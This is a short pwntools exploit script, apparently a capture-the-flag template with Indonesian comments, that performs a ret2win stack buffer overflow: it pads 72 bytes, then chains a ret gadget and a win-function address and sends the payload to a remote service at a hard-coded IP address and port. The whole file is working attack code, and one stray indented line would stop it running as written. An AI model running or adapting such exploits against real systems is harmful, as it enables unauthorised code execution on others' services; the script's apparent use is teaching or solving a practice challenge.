from pwn import *

# Untuk testing lokal:
# p = process('./vuln') 

# Nanti, jika lokal sudah berhasil, ganti menjadi:
 p = remote('103.127.98.249', 10001) 

# Ganti dengan alamat yang Anda temukan dari langkah 2
ret_address = 0x000000000040121e # Ganti dengan alamat ret gadget Anda
win_address = 0x0000000000401196 # Ganti dengan alamat fungsi win Anda
offset = 72 # Ganti jika hasil dari langkah 1 berbeda

# Membuat payload
payload = b'A' * offset
payload += p64(ret_address) # p64() otomatis mengubah ke Little Endian 64-bit
payload += p64(win_address)

# Mengirim payload dan membaca balasan
p.recvuntil(b"Give me your input:\n")
p.sendline(payload)
print(p.recvall().decode())
